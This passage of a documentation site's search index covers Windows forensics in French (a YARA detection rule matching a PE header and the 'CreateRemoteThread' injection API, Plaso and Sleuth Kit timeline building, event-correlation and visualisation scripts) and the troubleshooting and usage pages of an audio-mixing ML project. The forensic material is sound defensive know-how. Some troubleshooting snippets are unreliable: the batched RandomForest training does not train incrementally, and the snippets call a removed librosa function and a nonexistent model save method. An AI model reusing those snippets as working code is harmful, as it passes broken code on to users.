r\u00e8gles","text":"<p>R\u00e8gles optimis\u00e9es <pre><code>rule Optimized_Rule\n{\n    meta:\n        description = \"R\u00e8gle optimis\u00e9e pour les performances\"\n\n    strings:\n        // Utiliser des patterns sp\u00e9cifiques au d\u00e9but\n        $header = { 4D 5A ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 50 45 }\n\n        // \u00c9viter les patterns trop g\u00e9n\u00e9riques\n        $specific_string = \"Very specific malware string\"\n\n        // Utiliser des modificateurs pour r\u00e9duire les faux positifs\n        $api_call = \"CreateRemoteThread\" nocase wide ascii\n\n    condition:\n        // V\u00e9rifier d'abord les patterns les plus sp\u00e9cifiques\n        $header at 0 and ($specific_string or $api_call)\n}\n</code></pre></p>"},{"location":"tools-techniques/#configuration-des-performances","title":"Configuration des performances","text":"<p>Configuration YARA <pre><code># yara.conf\nstack_size: 16384\nmax_strings_per_rule: 10000\nmax_match_length: 1000000\n\n# Timeout pour les r\u00e8gles\ntimeout: 60\n\n# Optimisations\nfast_scan: true\ndisable_console_logs: true\n</code></pre></p>"},{"location":"tools-techniques/#timeline-analysis-reconstruction-temporelle","title":"Timeline Analysis - Reconstruction temporelle","text":""},{"location":"tools-techniques/#vue-densemble-de-lanalyse-temporelle","title":"Vue d'ensemble de l'analyse temporelle","text":"<p>L'analyse de timeline permet de reconstituer la chronologie des \u00e9v\u00e9nements sur un syst\u00e8me, essentielle pour comprendre la s\u00e9quence d'une intrusion.</p>"},{"location":"tools-techniques/#concepts-fondamentaux","title":"Concepts fondamentaux","text":"<p>Types de timestamps - MAC Times : Modified, Accessed, Created - Birth Time : Cr\u00e9ation du fichier (NTFS) - Event Times : Timestamps des \u00e9v\u00e9nements syst\u00e8me</p> <p>Sources de donn\u00e9es temporelles - Filesystem metadata - Event logs - Registry entries - Browser history - Network logs - Application logs</p>"},{"location":"tools-techniques/#creation-de-timelines","title":"Cr\u00e9ation de timelines","text":""},{"location":"tools-techniques/#outils-de-creation","title":"Outils de cr\u00e9ation","text":"<p>Plaso (log2timeline) <pre><code># Installation\npip install plaso\n\n# Cr\u00e9ation d'une timeline\nlog2timeline.py --storage-file timeline.plaso disk_image.dd\n\n# Conversion en CSV\npsort.py -o dynamic -w timeline.csv timeline.plaso\n\n# Filtrage temporel\npsort.py -o dynamic -w filtered_timeline.csv timeline.plaso \"date &gt; '2024-01-01' and date &lt; '2024-01-31'\"\n</code></pre></p> <p>Configuration Plaso <pre><code># plaso.conf\nparsers:\n  - chrome_cache\n  - chrome_cookies\n  - chrome_history\n  - firefox_cache\n  - firefox_cookies\n  - firefox_history\n  - windows_registry\n  - windows_eventlog\n  - prefetch\n  - lnk\n  - recycle_bin\n  - mft\n  - usnjrnl\n\noutput_format: l2tcsv\ntimezone: UTC\n</code></pre></p>"},{"location":"tools-techniques/#timeline-avec-tsk","title":"Timeline avec TSK","text":"<p>Cr\u00e9ation avec fls et mactime <pre><code># Cr\u00e9er le bodyfile\nfls -r -m / disk_image.dd &gt; bodyfile.txt\n\n# G\u00e9n\u00e9rer la timeline\nmactime -b bodyfile.txt -d &gt; filesystem_timeline.csv\n\n# Timeline avec timezone\nmactime -b bodyfile.txt -d -z EST5EDT &gt; timeline_est.csv\n</code></pre></p> <p>Timeline avanc\u00e9e <pre><code># Combiner plusieurs sources\nfls -r -m / disk_image.dd &gt; fs_bodyfile.txt\nmmls disk_image.dd | grep -E \"0[0-9]:\" | awk '{print $3}' &gt; partitions.txt\n\n# Cr\u00e9er timeline pour chaque partition\nfor partition in $(cat partitions.txt); do\n    fls -r -m / -o $partition disk_image.dd &gt;&gt; combined_bodyfile.txt\ndone\n\nmactime -b combined_bodyfile.txt -d &gt; complete_timeline.csv\n</code></pre></p>"},{"location":"tools-techniques/#correlation-devenements","title":"Corr\u00e9lation d'\u00e9v\u00e9nements","text":""},{"location":"tools-techniques/#correlation-multi-sources","title":"Corr\u00e9lation multi-sources","text":"<p>Script de corr\u00e9lation <pre><code>import pandas as pd\nfrom datetime import datetime, timedelta\n\ndef correlate_events(timeline_files, time_window=300):\n    \"\"\"\n    Corr\u00e9ler les \u00e9v\u00e9nements de plusieurs timelines\n    time_window: fen\u00eatre de corr\u00e9lation en secondes\n    \"\"\"\n\n    # Charger les timelines\n    timelines = {}\n    for name, file_path in timeline_files.items():\n        df = pd.read_csv(file_path)\n        df['timestamp'] = pd.to_datetime(df['timestamp'])\n        timelines[name] = df\n\n    correlations = []\n\n    # Comparer chaque \u00e9v\u00e9nement avec les autres sources\n    for source1_name, source1_df in timelines.items():\n        for _, event1 in source1_df.iterrows():\n            event1_time = event1['timestamp']\n\n            for source2_name, source2_df in timelines.items():\n                if source1_name != source2_name:\n                    # Trouver les \u00e9v\u00e9nements dans la fen\u00eatre temporelle\n                    time_start = event1_time - timedelta(seconds=time_window)\n                    time_end = event1_time + timedelta(seconds=time_window)\n\n                    correlated = source2_df[\n                        (source2_df['timestamp'] &gt;= time_start) &amp; \n                        (source2_df['timestamp'] &lt;= time_end)\n                    ]\n\n                    if not correlated.empty:\n                        for _, event2 in correlated.iterrows():\n                            correlations.append({\n                                'source1': source1_name,\n                                'event1': event1,\n                                'source2': source2_name,\n                                'event2': event2,\n                                'time_diff': (event2['timestamp'] - event1_time).total_seconds()\n                            })\n\n    return correlations\n\n# Utilisation\ntimeline_files = {\n    'filesystem': 'filesystem_timeline.csv',\n    'eventlog': 'eventlog_timeline.csv',\n    'registry': 'registry_timeline.csv',\n    'browser': 'browser_timeline.csv'\n}\n\ncorrelations = correlate_events(timeline_files)\n</code></pre></p>"},{"location":"tools-techniques/#detection-danomalies-temporelles","title":"D\u00e9tection d'anomalies temporelles","text":"<p>Analyse des gaps temporels <pre><code>def detect_temporal_anomalies(timeline_df, threshold_minutes=60):\n    \"\"\"\n    D\u00e9tecter les anomalies temporelles dans une timeline\n    \"\"\"\n    timeline_df['timestamp'] = pd.to_datetime(timeline_df['timestamp'])\n    timeline_df = timeline_df.sort_values('timestamp')\n\n    # Calculer les intervalles entre \u00e9v\u00e9nements\n    timeline_df['time_diff'] = timeline_df['timestamp'].diff()\n\n    # Identifier les gaps importants\n    large_gaps = timeline_df[\n        timeline_df['time_diff'] &gt; timedelta(minutes=threshold_minutes)\n    ]\n\n    # Identifier les pics d'activit\u00e9\n    activity_by_minute = timeline_df.groupby(\n        timeline_df['timestamp'].dt.floor('1min')\n    ).size()\n\n    mean_activity = activity_by_minute.mean()\n    std_activity = activity_by_minute.std()\n\n    activity_spikes = activity_by_minute[\n        activity_by_minute &gt; mean_activity + 2 * std_activity\n    ]\n\n    return {\n        'large_gaps': large_gaps,\n        'activity_spikes': activity_spikes,\n        'stats': {\n            'mean_activity_per_minute': mean_activity,\n            'std_activity_per_minute': std_activity\n        }\n    }\n</code></pre></p>"},{"location":"tools-techniques/#visualisation-des-donnees","title":"Visualisation des donn\u00e9es","text":""},{"location":"tools-techniques/#graphiques-temporels","title":"Graphiques temporels","text":"<p>Visualisation avec matplotlib <pre><code>import matplotlib.pyplot as plt\nimport matplotlib.dates as mdates\n\ndef create_timeline_visualization(timeline_df, output_path):\n    \"\"\"\n    Cr\u00e9er une visualisation de timeline\n    \"\"\"\n    timeline_df['timestamp'] = pd.to_datetime(timeline_df['timestamp'])\n\n    # Grouper par heure\n    hourly_activity = timeline_df.groupby(\n        timeline_df['timestamp'].dt.floor('1h')\n    ).size()\n\n    # Cr\u00e9er le graphique\n    fig, ax = plt.subplots(figsize=(15, 8))\n\n    ax.plot(hourly_activity.index, hourly_activity.values, \n            marker='o', linewidth=2, markersize=4)\n\n    # Formater les axes\n    ax.xaxis.set_major_formatter(mdates.DateFormatter('%Y-%m-%d %H:%M'))\n    ax.xaxis.set_major_locator(mdates.HourLocator(interval=6))\n    plt.xticks(rotation=45)\n\n    ax.set_xlabel('Time')\n    ax.set_ylabel('Number of Events')\n    ax.set_title('Timeline Activity')\n    ax.grid(True, alpha=0.3)\n\n    plt.tight_layout()\n    plt.savefig(output_path, dpi=300, bbox_inches='tight')\n    plt.close()\n</code></pre></p> <p>Visualisation interactive avec Plotly <pre><code>import plotly.graph_objects as go\nfrom plotly.subplots import make_subplots\n\ndef create_interactive_timeline(timeline_data, output_path):\n    \"\"\"\n    Cr\u00e9er une timeline interactive\n    \"\"\"\n    fig = make_subplots(\n        rows=len(timeline_data),\n        cols=1,\n        subplot_titles=list(timeline_data.keys()),\n        shared_xaxes=True,\n        vertical_spacing=0.02\n    )\n\n    colors = ['blue', 'red', 'green', 'orange', 'purple']\n\n    for i, (source, df) in enumerate(timeline_data.items()):\n        df['timestamp'] = pd.to_datetime(df['timestamp'])\n\n        # Grouper par heure\n        hourly_data = df.groupby(df['timestamp'].dt.floor('1h')).size()\n\n        fig.add_trace(\n            go.Scatter(\n                x=hourly_data.index,\n                y=hourly_data.values,\n                mode='lines+markers',\n                name=source,\n                line=dict(color=colors[i % len(colors)]),\n                hovertemplate='%{x}&lt;br&gt;Events: %{y}&lt;extra&gt;&lt;/extra&gt;'\n            ),\n            row=i+1,\n            col=1\n        )\n\n    fig.update_layout(\n        title='Multi-Source Timeline Analysis',\n        height=200 * len(timeline_data),\n        hovermode='x unified'\n    )\n\n    fig.write_html(output_path)\n</code></pre></p>"},{"location":"tools-techniques/#heatmaps-temporelles","title":"Heatmaps temporelles","text":"<p>Heatmap d'activit\u00e9 <pre><code>import seaborn as sns\n\ndef create_activity_heatmap(timeline_df, output_path):\n    \"\"\"\n    Cr\u00e9er une heatmap d'activit\u00e9 temporelle\n    \"\"\"\n    timeline_df['timestamp'] = pd.to_datetime(timeline_df['timestamp'])\n\n    # Extraire les composants temporels\n    timeline_df['hour'] = timeline_df['timestamp'].dt.hour\n    timeline_df['day'] = timeline_df['timestamp'].dt.day_name()\n\n    # Cr\u00e9er la matrice d'activit\u00e9\n    activity_matrix = timeline_df.groupby(['day', 'hour']).size().unstack(fill_value=0)\n\n    # Ordonner les jours\n    day_order = ['Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday', 'Sunday']\n    activity_matrix = activity_matrix.reindex(day_order)\n\n    # Cr\u00e9er la heatmap\n    plt.figure(figsize=(12, 8))\n    sns.heatmap(activity_matrix, \n                cmap='YlOrRd',\n                annot=True,\n                fmt='d',\n                cbar_kws={'label': 'Number of Events'})\n\n    plt.title('Activity Heatmap by Day and Hour')\n    plt.xlabel('Hour of Day')\n    plt.ylabel('Day of Week')\n    plt.tight_layout()\n    plt.savefig(output_path, dpi=300, bbox_inches='tight')\n    plt.close()\n</code></pre></p> <p>Cette approche m\u00e9thodique des outils et techniques forensiques permet une analyse compl\u00e8te et efficace des syst\u00e8mes Windows.</p>"},{"location":"troubleshooting/","title":"Troubleshooting Guide","text":"<p>This guide helps you resolve common issues when using MasterIA. If you encounter problems not covered here, please create an issue on GitHub.</p>"},{"location":"troubleshooting/#installation-issues","title":"Installation Issues","text":""},{"location":"troubleshooting/#python-version-problems","title":"Python Version Problems","text":"<p>Error: <code>ModuleNotFoundError</code> or compatibility issues</p> <p>Solution: <pre><code># Check Python version\npython --version\n\n# MasterIA requires Python 3.8+\n# Install Python 3.8 or higher if needed\n</code></pre></p>"},{"location":"troubleshooting/#dependencies-installation-failed","title":"Dependencies Installation Failed","text":"<p>Error: <code>pip install -r requirements.txt</code> fails</p> <p>Common Solutions:</p> <ol> <li> <p>Update pip:    <pre><code>python -m pip install --upgrade pip\n</code></pre></p> </li> <li> <p>Install system dependencies (Ubuntu/Debian):    <pre><code>sudo apt-get update\nsudo apt-get install python3-dev libsndfile1-dev ffmpeg\n</code></pre></p> </li> <li> <p>Install system dependencies (macOS):    <pre><code>brew install libsndfile ffmpeg\n</code></pre></p> </li> <li> <p>Install system dependencies (Windows):    <pre><code># Install Visual C++ Build Tools\n# Download from Microsoft website\n</code></pre></p> </li> </ol>"},{"location":"troubleshooting/#virtual-environment-issues","title":"Virtual Environment Issues","text":"<p>Error: Package conflicts or import errors</p> <p>Solution: <pre><code># Create clean virtual environment\npython -m venv venv_new\nsource venv_new/bin/activate  # On Windows: venv_new\\Scripts\\activate\npip install -r requirements.txt\n</code></pre></p>"},{"location":"troubleshooting/#audio-loading-problems","title":"Audio Loading Problems","text":""},{"location":"troubleshooting/#file-format-issues","title":"File Format Issues","text":"<p>Error: <code>librosa.load()</code> fails to load audio</p> <p>Common Causes and Solutions:</p> <ol> <li> <p>Unsupported format:    <pre><code># Convert to WAV using FFmpeg\nimport subprocess\nsubprocess.run(['ffmpeg', '-i', 'input.mp3', 'output.wav'])\n</code></pre></p> </li> <li> <p>Corrupted file:    <pre><code># Check file integrity\nimport librosa\ntry:\n    audio, sr = librosa.load('file.wav', sr=None)\n    print(f\"File loaded successfully: {len(audio)} samples at {sr} Hz\")\nexcept Exception as e:\n    print(f\"Error loading file: {e}\")\n</code></pre></p> </li> <li> <p>File path issues:    <pre><code>import os\n\n# Check if file exists\nif not os.path.exists('path/to/file.wav'):\n    print(\"File not found\")\n\n# Use absolute paths\nabs_path = os.path.abspath('path/to/file.wav')\n</code></pre></p> </li> </ol>"},{"location":"troubleshooting/#sample-rate-issues","title":"Sample Rate Issues","text":"<p>Error: Inconsistent sample rates across files</p> <p>Solution: <pre><code># Resample all files to consistent rate\nimport librosa\n\ndef resample_audio(input_file, output_file, target_sr=44100):\n    audio, sr = librosa.load(input_file, sr=None)\n    if sr != target_sr:\n        audio_resampled = librosa.resample(audio, orig_sr=sr, target_sr=target_sr)\n        librosa.output.write_wav(output_file, audio_resampled, target_sr)\n    else:\n        # Copy file if already correct sample rate\n        import shutil\n        shutil.copy(input_file, output_file)\n</code></pre></p>"},{"location":"troubleshooting/#memory-issues-with-large-files","title":"Memory Issues with Large Files","text":"<p>Error: <code>MemoryError</code> when loading large audio files</p> <p>Solution: <pre><code># Process files in chunks\ndef process_large_file(filename, chunk_duration=30):\n    \"\"\"Process large audio file in chunks\"\"\"\n    import librosa\n\n    # Get file duration\n    duration = librosa.get_duration(filename=filename)\n\n    results = []\n    for start in range(0, int(duration), chunk_duration):\n        # Load chunk\n        audio, sr = librosa.load(filename, \n                                offset=start, \n                                duration=chunk_duration,\n                                sr=None)\n\n        # Process chunk\n        chunk_features = extract_basic_features({f\"chunk_{start}\": audio})\n        results.append(chunk_features)\n\n    return results\n</code></pre></p>"},{"location":"troubleshooting/#feature-extraction-problems","title":"Feature Extraction Problems","text":""},{"location":"troubleshooting/#nan-values-in-features","title":"NaN Values in Features","text":"<p>Error: <code>ValueError</code> or <code>NaN</code> values in extracted features</p> <p>Solution: <pre><code>import numpy as np\n\ndef clean_features(features):\n    \"\"\"Clean features by removing NaN values\"\"\"\n    cleaned = {}\n    for filename, feature_dict in features.items():\n        cleaned[filename] = {}\n        for key, value in feature_dict.items():\n            if np.isnan(value):\n                cleaned[filename][key] = 0.0  # Replace NaN with 0\n            else:\n                cleaned[filename][key] = value\n    return cleaned\n\n# Use in your workflow\nfeatures = extract_basic_features(audio_data)\nfeatures = clean_features(features)\n</code></pre></p>"},{"location":"troubleshooting/#empty-or-silent-audio","title":"Empty or Silent Audio","text":"<p>Error: Features extracted from silent audio</p> <p>Solution: <pre><code>def detect_silence(audio, threshold=0.01):\n    \"\"\"Detect if audio is mostly silent\"\"\"\n    rms = np.sqrt(np.mean(audio**2))\n    return rms &lt; threshold\n\n# Filter out silent files\nfiltered_audio = {}\nfor filename, audio in audio_data.items():\n    if not detect_silence(audio):\n        filtered_audio[filename] = audio\n    else:\n        print(f\"Skipping silent file: {filename}\")\n</code></pre></p>"},{"location":"troubleshooting/#feature-extraction-slow","title":"Feature Extraction Slow","text":"<p>Problem: Feature extraction takes too long</p> <p>Solutions:</p> <ol> <li> <p>Parallel processing:    <pre><code>from multiprocessing import Pool\nimport functools\n\ndef extract_features_parallel(audio_data, n_processes=4):\n    with Pool(n_processes) as pool:\n        extract_func = functools.partial(extract_basic_features)\n        # Split audio_data into chunks\n        chunks = list(chunk_dict(audio_data, len(audio_data)//n_processes))\n        results = pool.map(extract_func, chunks)\n    return merge_results(results)\n</code></pre></p> </li> <li> <p>Reduce feature complexity:    <pre><code># Use fewer MFCC coefficients\nmfcc_features = extract_mfcc(audio_data, n_mfcc=8)  # Instead of 13\n</code></pre></p> </li> <li> <p>Cache results:    <pre><code>import pickle\n\ndef cache_features(features, cache_file):\n    with open(cache_file, 'wb') as f:\n        pickle.dump(features, f)\n\ndef load_cached_features(cache_file):\n    try:\n        with open(cache_file, 'rb') as f:\n            return pickle.load(f)\n    except FileNotFoundError:\n        return None\n</code></pre></p> </li> </ol>"},{"location":"troubleshooting/#model-training-issues","title":"Model Training Issues","text":""},{"location":"troubleshooting/#insufficient-training-data","title":"Insufficient Training Data","text":"<p>Error: Model performance is poor or training fails</p> <p>Solution: <pre><code># Check data distribution\nimport pandas as pd\nfrom collections import Counter\n\ndef analyze_data_distribution(y):\n    \"\"\"Analyze label distribution in training data\"\"\"\n    label_counts = Counter(y)\n\n    print(\"Label distribution:\")\n    for label, count in label_counts.items():\n        print(f\"  {label}: {count} samples\")\n\n    # Check for class imbalance\n    min_count = min(label_counts.values())\n    max_count = max(label_counts.values())\n\n    if max_count / min_count &gt; 10:\n        print(\"Warning: Significant class imbalance detected\")\n\n    return label_counts\n\n# Analyze your data\nlabel_counts = analyze_data_distribution(y)\n\n# Minimum recommended samples per class\nif any(count &lt; 10 for count in label_counts.values()):\n    print(\"Warning: Some classes have fewer than 10 samples\")\n</code></pre></p>"},{"location":"troubleshooting/#memory-error-during-training","title":"Memory Error During Training","text":"<p>Error: <code>MemoryError</code> or system runs out of memory</p> <p>Solution: <pre><code># Use batch training for large datasets\nfrom sklearn.model_selection import train_test_split\n\ndef train_model_in_batches(X, y, batch_size=1000):\n    \"\"\"Train model in batches to save memory\"\"\"\n    from sklearn.ensemble import RandomForestClassifier\n\n    # Initialize model\n    model = RandomForestClassifier(n_estimators=100, warm_start=True)\n\n    # Train in batches\n    for i in range(0, len(X), batch_size):\n        X_batch = X[i:i+batch_size]\n        y_batch = y[i:i+batch_size]\n\n        # Fit model (incrementally)\n        model.fit(X_batch, y_batch)\n\n    return model\n</code></pre></p>"},{"location":"troubleshooting/#model-overfitting","title":"Model Overfitting","text":"<p>Problem: High training accuracy but poor test performance</p> <p>Solution: <pre><code># Use cross-validation\nfrom sklearn.model_selection import cross_val_score, StratifiedKFold\n\ndef evaluate_model_robustly(X, y, model):\n    \"\"\"Evaluate model with cross-validation\"\"\"\n    cv = StratifiedKFold(n_splits=5, shuffle=True, random_state=42)\n    scores = cross_val_score(model, X, y, cv=cv, scoring='accuracy')\n\n    print(f\"Cross-validation scores: {scores}\")\n    print(f\"Mean CV score: {scores.mean():.3f} (+/- {scores.std() * 2:.3f})\")\n\n    return scores\n\n# Regularization techniques\nfrom sklearn.ensemble import RandomForestClassifier\n\n# Reduce complexity\nmodel = RandomForestClassifier(\n    n_estimators=50,  # Reduce from 100\n    max_depth=10,     # Limit tree depth\n    min_samples_split=10,  # Increase minimum samples\n    min_samples_leaf=5     # Increase minimum leaf samples\n)\n</code></pre></p>"},{"location":"troubleshooting/#slow-model-training","title":"Slow Model Training","text":"<p>Problem: Training takes too long</p> <p>Solutions:</p> <ol> <li> <p>Reduce model complexity:    <pre><code># Use fewer estimators\nmodel = RandomForestClassifier(n_estimators=50)  # Instead of 100\n</code></pre></p> </li> <li> <p>Use parallel processing:    <pre><code># Use all CPU cores\nmodel = RandomForestClassifier(n_jobs=-1)\n</code></pre></p> </li> <li> <p>Feature selection:    <pre><code>from sklearn.feature_selection import SelectKBest, f_classif\n\n# Select top K features\nselector = SelectKBest(score_func=f_classif, k=50)\nX_selected = selector.fit_transform(X, y)\n</code></pre></p> </li> </ol>"},{"location":"troubleshooting/#inference-problems","title":"Inference Problems","text":""},{"location":"troubleshooting/#model-loading-errors","title":"Model Loading Errors","text":"<p>Error: <code>FileNotFoundError</code> or model loading fails</p> <p>Solution: <pre><code>import os\nimport joblib\n\ndef safe_load_model(model_path):\n    \"\"\"Safely load model with error handling\"\"\"\n    if not os.path.exists(model_path):\n        raise FileNotFoundError(f\"Model file not found: {model_path}\")\n\n    try:\n        model = joblib.load(model_path)\n        return model\n    except Exception as e:\n        print(f\"Error loading model: {e}\")\n        return None\n\n# Use in your code\nmodel = safe_load_model(\"models/trained_model.pkl\")\nif model is None:\n    print(\"Please train a model first\")\n</code></pre></p>"},{"location":"troubleshooting/#prediction-errors","title":"Prediction Errors","text":"<p>Error: Shape mismatch or prediction fails</p> <p>Solution: <pre><code>def validate_input_shape(X, expected_features):\n    \"\"\"Validate input data shape\"\"\"\n    if X.shape[1] != expected_features:\n        raise ValueError(f\"Expected {expected_features} features, got {X.shape[1]}\")\n\n# Save feature information with model\ndef save_model_with_metadata(model, feature_names, model_path):\n    \"\"\"Save model with feature metadata\"\"\"\n    model_data = {\n        'model': model,\n        'feature_names': feature_names,\n        'n_features': len(feature_names)\n    }\n    joblib.dump(model_data, model_path)\n\ndef load_model_with_metadata(model_path):\n    \"\"\"Load model with feature metadata\"\"\"\n    model_data = joblib.load(model_path)\n    return model_data['model'], model_data['feature_names']\n</code></pre></p>"},{"location":"troubleshooting/#performance-issues","title":"Performance Issues","text":""},{"location":"troubleshooting/#slow-audio-processing","title":"Slow Audio Processing","text":"<p>Problem: Audio processing is too slow</p> <p>Solutions:</p> <ol> <li> <p>Optimize audio loading:    <pre><code># Load only necessary duration\naudio, sr = librosa.load(filename, \n                        duration=30,  # Only load 30 seconds\n                        sr=22050)     # Lower sample rate\n</code></pre></p> </li> <li> <p>Use faster feature extraction:    <pre><code># Use hop_length to reduce computation\nmfccs = librosa.feature.mfcc(y=audio, \n                            sr=sr, \n                            n_mfcc=13,\n                            hop_length=1024)  # Increase hop_length\n</code></pre></p> </li> <li> <p>Batch processing:    <pre><code>def process_files_in_batches(file_list, batch_size=10):\n    \"\"\"Process files in batches\"\"\"\n    for i in range(0, len(file_list), batch_size):\n        batch = file_list[i:i+batch_size]\n        # Process batch\n        yield process_batch(batch)\n</code></pre></p> </li> </ol>"},{"location":"troubleshooting/#high-memory-usage","title":"High Memory Usage","text":"<p>Problem: Application uses too much memory</p> <p>Solutions:</p> <ol> <li> <p>Clear variables:    <pre><code>import gc\n\n# Clear large variables\ndel large_audio_data\ngc.collect()\n</code></pre></p> </li> <li> <p>Use generators:    <pre><code>def audio_data_generator(file_list):\n    \"\"\"Generate audio data on demand\"\"\"\n    for filename in file_list:\n        audio, sr = librosa.load(filename, sr=None)\n        yield filename, audio\n\n# Use generator instead of loading all files\nfor filename, audio in audio_data_generator(file_list):\n    # Process one file at a time\n    pass\n</code></pre></p> </li> </ol>"},{"location":"troubleshooting/#documentation-and-development","title":"Documentation and Development","text":""},{"location":"troubleshooting/#mkdocs-build-errors","title":"MkDocs Build Errors","text":"<p>Error: Documentation build fails</p> <p>Solution: <pre><code># Install dependencies\npip install mkdocs mkdocs-material mkdocstrings\n\n# Check for syntax errors\nmkdocs build --strict\n\n# Common fixes\n# 1. Fix markdown syntax errors\n# 2. Check file paths in navigation\n# 3. Verify code block syntax\n</code></pre></p>"},{"location":"troubleshooting/#jupyter-notebook-issues","title":"Jupyter Notebook Issues","text":"<p>Error: Notebooks won't run or display errors</p> <p>Solutions:</p> <ol> <li> <p>Kernel issues:    <pre><code># Install kernel\npython -m ipykernel install --user --name=masterai\n\n# Restart kernel in notebook\n# Kernel -&gt; Restart &amp; Clear Output\n</code></pre></p> </li> <li> <p>Missing dependencies:    <pre><code># Install in notebook\n!pip install missing_package\n</code></pre></p> </li> <li> <p>Path issues:    <pre><code># Add project root to path\nimport sys\nsys.path.append('../')\n</code></pre></p> </li> </ol>"},{"location":"troubleshooting/#getting-help","title":"Getting Help","text":""},{"location":"troubleshooting/#before-asking-for-help","title":"Before Asking for Help","text":"<ol> <li>Check this troubleshooting guide</li> <li>Search existing issues on GitHub</li> <li>Try the minimal example to isolate the problem</li> <li>Check your Python and library versions</li> </ol>"},{"location":"troubleshooting/#creating-a-good-bug-report","title":"Creating a Good Bug Report","text":"<p>When reporting issues, include:</p> <ol> <li> <p>System information:    <pre><code>import sys\nimport librosa\nimport sklearn\nimport tensorflow\n\nprint(f\"Python: {sys.version}\")\nprint(f\"LibROSA: {librosa.__version__}\")\nprint(f\"Scikit-learn: {sklearn.__version__}\")\nprint(f\"TensorFlow: {tensorflow.__version__}\")\n</code></pre></p> </li> <li> <p>Minimal reproduction example:    <pre><code># Provide the smallest code that reproduces the issue\nfrom src.data_processing import load_audio_files\n\n# This fails\naudio_data = load_audio_files(\"path/to/files\")\n</code></pre></p> </li> <li> <p>Error traceback: Copy the complete error message</p> </li> <li> <p>Expected vs actual behavior: Describe what should happen vs what happens</p> </li> </ol>"},{"location":"troubleshooting/#community-resources","title":"Community Resources","text":"<ul> <li>GitHub Issues: Report bugs and request features</li> <li>GitHub Discussions: Ask questions and share ideas</li> <li>Documentation: Read the full documentation</li> <li>Examples: Check the <code>notebooks/</code> directory for working examples</li> </ul>"},{"location":"troubleshooting/#common-workflow-issues","title":"Common Workflow Issues","text":""},{"location":"troubleshooting/#no-module-named-src","title":"\"No module named 'src'\"","text":"<p>Solution: <pre><code># Add project root to Python path\nimport sys\nimport os\nsys.path.append(os.path.dirname(os.path.abspath(__file__)))\n\n# Or use relative imports\nfrom .src.data_processing import load_audio_files\n</code></pre></p>"},{"location":"troubleshooting/#model-file-not-found","title":"\"Model file not found\"","text":"<p>Solution: <pre><code># Check model directory\nimport os\nif not os.path.exists(\"models/\"):\n    os.makedirs(\"models/\")\n\n# Train model if not exists\nif not os.path.exists(\"models/trained_model.pkl\"):\n    print(\"Training new model...\")\n    # Train and save model\n</code></pre></p>"},{"location":"troubleshooting/#feedback-file-not-found","title":"\"Feedback file not found\"","text":"<p>Solution: <pre><code># Create empty feedback file\nimport json\nif not os.path.exists(\"feedback.json\"):\n    with open(\"feedback.json\", \"w\") as f:\n        pass  # Create empty file\n</code></pre></p> <p>Remember: Most issues are common and solvable! Don't hesitate to ask for help in the community forums.</p>"},{"location":"usage/","title":"Usage Guide","text":""},{"location":"usage/#installation-and-setup","title":"Installation and Setup","text":""},{"location":"usage/#prerequisites","title":"Prerequisites","text":"<p>Before using MasterIA, ensure you have Python 3.8+ installed on your system.</p>"},{"location":"usage/#installation","title":"Installation","text":"<ol> <li> <p>Clone the repository: <pre><code>git clone https://github.com/Esgr0bar/MasterIA.git\ncd MasterIA\n</code></pre></p> </li> <li> <p>Create and activate a virtual environment: <pre><code>python -m venv venv\nsource venv/bin/activate  # On Windows: venv\\Scripts\\activate\n</code></pre></p> </li> <li> <p>Install dependencies: <pre><code>pip install -r requirements.txt\n</code></pre></p> </li> </ol>"},{"location":"usage/#quick-start","title":"Quick Start","text":""},{"location":"usage/#1-basic-usage-command-line","title":"1. Basic Usage - Command Line","text":"<p>Run the main application: <pre><code>python main.py\n</code></pre></p> <p>This will: - Load audio data from <code>data/audio_with_metadata/</code> - Extract features and train an initial model - Run inference on new audio files from <code>data/new_audio/</code> - Display suggested actions and cuts - Collect user feedback for model improvement</p>"},{"location":"usage/#2-using-individual-components","title":"2. Using Individual Components","text":"<p>Data Processing: <pre><code>from src.data_processing import load_audio_files_with_metadata\n\n# Load audio files with metadata\ndata_dir = \"data/audio_with_metadata/\"\naudio_data, metadata = load_audio_files_with_metadata(data_dir)\n</code></pre></p> <p>Feature Extraction: <pre><code>from src.feature_extraction import extract_basic_features, extract_mfcc\n\n# Extract basic features\nfeatures = extract_basic_features(audio_data)\n\n# Extract MFCC features\nmfcc_features = extract_mfcc(audio_data, n_mfcc=13)\n</code></pre></p> <p>Model Training: <pre><code>from src.model_training import prepare_data_for_training, train_model\n\n# Prepare data for training\nX, y = prepare_data_for_training(features, metadata)\n\n# Train the model\nmodel = train_model(X, y)\n</code></pre></p> <p>Inference: <pre><code>from src.inference import run_inference\n\n# Run inference on new audio data\nmodel_path = \"models/trained_model.pkl\"\nsuggested_actions, suggested_cuts = run_inference(model_path, new_audio_data)\n</code></pre></p>"},{"location":"usage/#data-preparation","title":"Data Preparation","text":""},{"location":"usage/#audio-file-format","title":"Audio File Format","text":"<p>MasterIA expects audio files in WAV format with accompanying JSON metadata files:</p> <pre><code>data/audio_with_metadata/\n\u251c\u2500\u2500 track1.wav\n\u251c\u2500\u2500 track1.json\n\u251c\u2500\u2500 track2.wav\n\u251c\u2500\u2500 track2.json\n\u2514\u2500\u2500 ...\n</code></pre>"},{"location":"usage/#metadata-format","title":"Metadata Format","text":"<p>Each audio file should have a corresponding JSON metadata file:</p> <pre><code>{\n  \"title\": \"Track Name\",\n  \"artist\": \"Artist Name\",\n  \"genre\": \"Hip-hop\",\n  \"bpm\": 120,\n  \"key\": \"C major\",\n  \"effects\": [\n    {\n      \"effect\": \"EQ\",\n      \"target\": \"vocals\",\n      \"level\": 0.7\n    },\n    {\n      \"effect\": \"Reverb\",\n      \"target\": \"drums\",\n      \"level\": 0.3\n    }\n  ]\n}\n</code></pre>"},{"location":"usage/#advanced-usage","title":"Advanced Usage","text":""},{"location":"usage/#custom-model-training","title":"Custom Model Training","text":"<p>You can train custom models for specific genres or use cases:</p> <pre><code>from src.model_training import train_model\nfrom src.feature_extraction import extract_basic_features\n\n# Extract features for your specific dataset\nfeatures = extract_basic_features(genre_specific_data)\n\n# Train a genre-specific model\nmodel = train_model(features, genre_labels)\n\n# Save the model\nmodel.save(\"models/genre_specific_model.pkl\")\n</code></pre>"},{"location":"usage/#batch-processing","title":"Batch Processing","text":"<p>Process multiple audio files at once:</p> <pre><code>from src.data_processing import load_audio_files\nfrom src.inference import run_inference\n\n# Load multiple audio files\naudio_files = 